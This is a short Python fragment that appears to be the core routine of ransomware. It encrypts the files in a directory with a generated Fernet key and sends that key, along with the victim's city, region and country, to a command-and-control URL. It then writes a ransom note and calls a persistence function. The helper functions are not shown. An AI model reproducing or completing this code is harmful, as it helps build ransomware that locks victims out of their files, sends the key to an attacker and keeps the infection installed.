    key = Fernet.generate_key()
    encrypt_files(directory, key)
    data = {
        'key': key.decode(),
        'geolocation': {
            'city': city,
            'region': region,
            'country': country
        }
    }
    requests.post(c2_url, json=data)
    create_ransom_note(directory, note)
    ensure_persistence()
